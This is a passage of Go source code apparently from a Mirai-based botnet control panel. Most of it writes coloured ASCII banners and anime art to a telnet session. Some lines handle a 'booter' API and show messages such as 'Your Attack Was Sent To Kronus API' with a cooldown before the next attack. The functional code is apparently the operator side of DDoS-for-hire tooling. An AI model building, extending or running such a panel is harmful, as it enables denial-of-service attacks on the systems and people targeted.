            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[32m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[32m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[34m           / == /       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |  |        \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[33m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[33m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[33m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[33m|                         |        \r\n"))
            this.conn.Write([]byte("\033[33m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[93m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[37m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[37m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[37m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
 		    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                 
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                               
            this.conn.Write([]byte("\033[97m\r\n"))
            this.conn.Write([]byte("\033[37m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))                                                                                                
            this.conn.Write([]byte("\033[93m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝         \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║           \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[33m\r\n"))
            this.conn.Write([]byte("\033[1;49;35m  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝         \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║            \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║             \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝            \033[0m \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
			time.Sleep(750 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header	
			this.conn.Write([]byte("\033[1;49;32m	                         ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                            ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                  \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╔══════════════════════════════════════════╗    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mYour Attack Was Sent To Kronus API       \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32mPlease Wait 2 Minutes For Next Attack    \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ║ \033[1;49;32m            Kronus                       \033[1;49;35m║    \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m	        ╚══════════════════════════════════════════╝    \033[0m \r\n"))	
			this.conn.Write([]byte("\033[1;49;35m                                                           \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                    ███████╗███████╗███╗   ██╗████████╗    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████╗█████╗  ██╔██╗ ██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚════██║██╔══╝  ██║╚██╗██║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ███████║███████╗██║ ╚████║   ██║       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m\r\n"))	
				continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║Error... IP Address Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35m                              ║API Server Result\033[1;49;32m: \r\n\033[93m" + locformatted + "\x1b[0m\r\n"))
        }
        ///////////////////////// END OF API BOOTER
        ///////////////////////// anti crash
        if strings.Contains(cmd, "@") {
            continue
        }
        ///////////////////////// END OF API BOOTER
		if err != nil || cmd == "xanax" || cmd == "XANAX" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m███\x1b[0;37m╗   \x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m█████\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m████\x1b[0;37m╗  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m╗╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m╔╝\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m ╚\x1b[0;35m███\x1b[0;37m╔╝ \x1b[0;35m███████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m║\x1b[0;35m███████\x1b[0;37m║ ╚\x1b[0;35m███\x1b[0;37m╔╝ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║╚\x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔══\x1b[0;35m██\x1b[0;37m║\x1b[0;35m ██\x1b[0;37m╔\x1b[0;35m██\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\r \x1b[0;35m██\x1b[0;37m╔╝ \x1b[0;35m██\x1b[0;37m╗\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║ ╚\x1b[0;35m████\x1b[0;37m║\x1b[0;35m██\x1b[0;37m║  \x1b[0;35m██\x1b[0;37m║\x1b[0;35m██\x1b[0;37m╔╝\x1b[0;35m ██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\r \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\r   \x1b[0;35m*** \x1b[0;37mWelcome To Xanax | Version 2.0 \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r       \x1b[0;35m*** \x1b[0;37mPowered By Mirai #Reps \x1b[0;35m***\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }		
        	 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 	
				if err != nil || cmd == "xeon" || cmd == "XEON" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[0m                                           \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m     \x1b[32m██\x1b[0m╗  \x1b[32m██\x1b[0m╗\x1b[32m███████\x1b[0m╗ \x1b[32m██████\x1b[0m╗ \x1b[32m███\x1b[0m╗  \x1b[32m ██\x1b[0m╗  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m   \x1b[0m  ╚\x1b[32m██\x1b[0m╗\x1b[32m██\x1b[0m╔╝\x1b[32m██\x1b[0m╔════╝\x1b[32m██\x1b[0m╔═══\x1b[32m██\x1b[0m╗\x1b[32m████\x1b[0m╗  \x1b[32m██\x1b[0m║  \r\n"))
			this.conn.Write([]byte("\x1b[0m \x1b[32m     \x1b[0m ╚\x1b[32m███\x1b[0m╔╝ \x1b[32m█████\x1b[0m╗  \x1b[32m██\x1b[0m║   \x1b[32m██\x1b[0m║\x1b[32m██\x1b[0m╔\x1b[32m██\x1b[0m╗ \x1b[32m██\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m      ██\x1b[0m╔\x1b[32m██\x1b[0m╗ \x1b[32m██\x1b[0m╔══╝  \x1b[32m██\x1b[0m║   \x1b[32m██\x1b[0m║\x1b[32m██\x1b[0m║╚\x1b[32m██\x1b[0m╗\x1b[32m██\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m \x1b[32m     ██\x1b[0m╔╝\x1b[32m ██\x1b[0m╗\x1b[32m███████\x1b[0m╗╚\x1b[32m██████\x1b[0m╔╝\x1b[32m██\x1b[0m║ ╚\x1b[32m████\x1b[0m║  \r\n"))
            this.conn.Write([]byte("\x1b[0m      ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝  \r\n"))
            this.conn.Write([]byte("\x1b[0m               Type \x1b[32mHELP \x1b[0mFor \x1b[32mHelp          \r\n"))
			this.conn.Write([]byte("\x1b[0m                                           \r\n"))
            continue
        }
           /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 
        		if err != nil || cmd == "ICED" || cmd == "iced" {
        	this.conn.Write([]byte("\033[2J\033[1H"))
        	this.conn.Write([]byte("\x1b[0m                                        \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m       \x1b[36m██▓ \x1b[36m▄████▄\x1b[0m  ▓\x1b[36m█████ ▓\x1b[36m█████▄     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      ▓\x1b[36m██\x1b[0m▒▒\x1b[36m██▀ ▀█  ▓█   ▀ \x1b[0m▒\x1b[36m██▀ ██▌    \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m▒\x1b[36m██\x1b[0m▒▒\x1b[36m▓█    ▄ \x1b[0m▒\x1b[36m███  \x1b[0m ░\x1b[36m██   █▌    \r\n"))
			this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m██\x1b[0m░▒\x1b[36m▓▓▄ ▄██\x1b[0m▒▒▓\x1b[36m█  ▄ \x1b[0m░\x1b[36m▓█▄   ▌    \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m██\x1b[0m░▒ \x1b[36m▓███▀ \x1b[0m░░▒\x1b[36m████\x1b[0m▒░▒\x1b[36m████\x1b[0m▓     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m      \x1b[0m░\x1b[36m▓ \x1b[0m ░ ░▒ ▒  ░░░ ▒░ ░ ▒▒▓ \x1b[0m ▒     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ▒ ░  ░  ▒    ░ ░  ░ ░ ▒  ▒     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ▒ ░░           ░    ░ ░  ░     \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m      ░  ░ ░         ░  ░   ░        \r\n"))
            this.conn.Write([]byte("\x1b[0m  \x1b[36m \x1b[0m         ░                ░                                         \r\n"))
            this.conn.Write([]byte("\x1b[0m             Type \x1b[36mHELP \x1b[0mFor \x1b[36mHelp          \r\n"))
			this.conn.Write([]byte("\x1b[0m                                           \r\n")) 
            continue
        }
if err != nil || cmd == "anime" || cmd == "ANIME" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))            
this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                   \033[1;49;32m┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐  ┌─┐┌┐┌┬┌┬┐┌─┐ ┌┬┐┬ ┬┌┐┌┬ ┬\033[0m \r\n")) 
this.conn.Write([]byte("\033[1;49;35m                   \033[1;49;32m├┴┐ ├┰┘ │ │ │││ │ │ └─┐  ├─┤│││││││├┤  ││││ │││││ │\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                   \033[1;49;32m┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘  ┴ ┴┘└┘┴┴ ┴└─┘ ┴ ┴└─┘┘└┘└─┘\033[0m \r\n"))                        
this.conn.Write([]byte("\033[1;49;35m                ╔══════════════════════════════╦════════════════════════════╗\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ 2th hokage -                 ║   yumeko -                 ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ pikachu -                    ║   nina -                   ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ nez -                        ║   nezuko -                 ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ sasuke -                     ║   coco -                   ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ naruto -                     ║   kakashi2 -               ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ kakashi -                    ║                            ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║ hinata -                     ║                            ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ║                              ║                            ║\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m                ╚══════════════════════════════╩════════════════════════════╝\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
				  continue
        }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/ 
if err != nil || cmd == "2th" || cmd == "2th hokage" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣯⣿⠄⠄⠄⠄⠄⡏⠄⠄⠄⠄⢨⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠋⠄⠄⠄⠄⠄⠐⣩⣿⡿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⠘⢿⠄⠄⠄⠄⠄⠃⠄⠄⠄⠄⠈⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠟⠁⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡕⢧⡇⠄⠈⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣻⠯⢷⠄⠈⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠰⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠋⣾⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠈⡀⠄⠄⠄⠄⠄⠄⠄⠘⣂⠄⠄⠄⠄⢄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⠿⣹⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣛⠳⠿⡇⡀⠄⠄⠄⠄⠄⠠⡀⠄⠄⠙⢸⣦⡀⣧⠄⠄⠄⢀⠔⡙⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⠦⣄⠈⠑⠄⠄⠄⠄⠄⠄⢨⣦⣀⣐⣘⣿⡏⠻⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣫⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣦⡀⡉⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠱⢿⣿⣯⠻⢷⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣼⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣅⣛⠚⠂⠄⠄⠄⠄⠄⠄⠊⣝⢿⣿⣟⠛⠣⠄⠁⠄⠄⠄⠄⢄⡠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠚⣻⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⣑⠃⡛⠆⠒⠄⠄⠄⠄⠄⡀⣘⣶⣿⣿⣷⠆⠄⠄⠄⠄⠄⠄⠌⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣴⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣂⡰⠆⠋⠄⠄⠄⠄⠘⠉⠻⣿⣿⣿⣦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣫⠫⢂⡀⡰⠄⠄⠄⠄⠄⠒⣿⣿⣿⠟⢿⣭⣔⠄⠄⠄⢠⡂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
